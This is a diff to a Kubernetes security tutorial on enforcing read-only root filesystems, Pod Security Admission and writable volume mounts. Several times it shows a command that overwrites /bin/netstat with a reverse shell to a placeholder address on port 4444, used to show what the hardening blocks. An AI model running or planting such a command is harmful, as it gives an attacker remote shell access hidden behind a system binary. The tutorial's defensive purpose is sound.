@@ -22,19 +22,19 @@ A writable root filesystem gives an attacker with code execution inside a contai
 With code execution in a container, dropping a file takes one command:
 
 ```bash
-printf '#!/bin/sh\nbash -i >& /dev/tcp/192.0.2.1/4444 0>&1\n' > /bin/netstat
+printf '#!/bin/bash\nbash -i >& /dev/tcp/192.0.2.1/4444 0>&1\n' > /bin/netstat
 ls -la /bin/netstat
 ```
 
 ```output
--rw-r--r--    1 root     root            51 Apr 11 05:23 /bin/netstat
+-rw-r--r--    1 root     root            52 Apr 11 05:23 /bin/netstat
 ```
 
 The write succeeds and nothing in the Kubernetes audit log records it. The file stays on the container filesystem until the container restarts or the pod terminates. Without a runtime security tool watching for unexpected filesystem writes, there is no signal that this happened.
 
 ## Enforcing at the Namespace Level with Pod Security Admission
 
-Pod Security Admission is built into Kubernetes since v1.25 and requires no additional tooling. Applying the `restricted` profile to a namespace rejects pods that do not meet its required controls: `allowPrivilegeEscalation: false`, `capabilities.drop: ["ALL"]`, a non-root user, and a seccomp profile. `readOnlyRootFilesystem: true` is not part of the `restricted` profile and must be set explicitly on each container.
+Pod Security Admission is built into Kubernetes (beta since v1.23, stable since v1.25) and requires no additional tooling. Applying the `restricted` profile to a namespace rejects pods that do not meet its required controls: `allowPrivilegeEscalation: false`, `capabilities.drop: ["ALL"]`, a non-root user, and a seccomp profile. `readOnlyRootFilesystem: true` is not part of the `restricted` profile and must be set explicitly on each container.
 
 ```bash
 kubectl label namespace <your-namespace> pod-security.kubernetes.io/enforce=restricted
@@ -93,11 +93,11 @@ spec:
 With this in place, any write to the root filesystem is blocked:
 
 ```bash
-printf '#!/bin/sh\nbash -i >& /dev/tcp/192.0.2.1/4444 0>&1\n' > /bin/netstat
+printf '#!/bin/bash\nbash -i >& /dev/tcp/192.0.2.1/4444 0>&1\n' > /bin/netstat
 ```
 
 ```output
-sh: can't create /bin/netstat: Read-only file system
+bash: /bin/netstat: Read-only file system
 ```
 
 ## Allowing Legitimate Writes with Volumes
@@ -118,7 +118,7 @@ cat /proc/mounts | grep -E "/tmp|/scratch"
 ```
 
 ```output
-tmpfs /tmp tmpfs rw,relatime,size=12235320k,noswap 0 0
+tmpfs /tmp tmpfs rw,relatime,size=12235320k 0 0
 /dev/vda1 /scratch ext4 rw,relatime,discard 0 0
 ```
 
@@ -156,12 +156,12 @@ Writes to mounted paths succeed while the root filesystem stays read-only:
 
 ```bash
 echo "app runtime data" > /tmp/gunicorn.pid && cat /tmp/gunicorn.pid
-printf '#!/bin/sh\nbash -i >& /dev/tcp/192.0.2.1/4444 0>&1\n' > /bin/netstat
+printf '#!/bin/bash\nbash -i >& /dev/tcp/192.0.2.1/4444 0>&1\n' > /bin/netstat
 ```
 
 ```output
 app runtime data
-sh: can't create /bin/netstat: Read-only file system
+bash: /bin/netstat: Read-only file system
 ```
 
 ## Adapting Applications for a Read-Only Filesystem
